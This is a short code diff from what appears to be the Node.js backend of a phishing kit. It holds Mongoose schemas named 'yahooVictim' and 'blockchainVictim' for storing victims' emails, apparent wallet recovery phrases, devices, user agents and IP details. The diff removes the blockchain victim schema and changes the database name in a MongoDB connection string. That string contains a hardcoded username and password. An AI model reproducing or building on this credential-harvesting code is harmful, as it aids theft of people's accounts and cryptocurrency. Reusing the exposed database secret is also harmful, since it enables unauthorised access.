@@ -9,12 +9,10 @@ const port = process.env.PORT || 9000;
     s = new Sniffr(),
     yahooVictimSchema = null,
     yahooVictim = null,
-    blockchainVictimSchema = null,
-    blockchainVictim = null,
     visitorIp = null,
     db = null;
 
-mongoose.connect("mongodb+srv://dbUser:nfyZeLTQB6sqpdF@cluster0.dii5a.mongodb.net/myFirstDatabase?retryWrites=true&w=majority", {
+mongoose.connect("mongodb+srv://dbUser:nfyZeLTQB6sqpdF@cluster0.dii5a.mongodb.net/db2?retryWrites=true&w=majority", {
     useNewUrlParser: true,
     useUnifiedTopology: true
 })
@@ -35,17 +33,6 @@ yahooVictimSchema = new mongoose.Schema({
 
 yahooVictim = mongoose.model("yahooVictim", yahooVictimSchema);
 
-blockchainVictimSchema = new mongoose.Schema({
-    email: String,
-    phrase: String,
-    userDevice: String,
-    userAgent: String,
-    victimIpInfo: {}
-}, {
-    minimize: false
-})
-
-blockchainVictim = mongoose.model("blockchainVictim", blockchainVictimSchema);
 
 
 
